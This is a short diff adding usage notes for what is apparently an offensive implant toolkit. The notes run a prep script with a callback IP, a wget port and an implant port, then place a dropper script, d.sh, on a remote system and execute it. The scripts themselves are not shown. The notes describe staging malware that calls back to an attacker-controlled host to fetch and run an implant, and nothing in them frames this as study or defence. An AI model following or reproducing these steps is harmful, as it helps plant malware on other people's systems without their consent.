@@ -1,0 +1,3 @@
+# How to prep
+./prep.sh callbackIP wgetport implantport
+# Place d.sh on the remote system and execute (d stands for dropper)
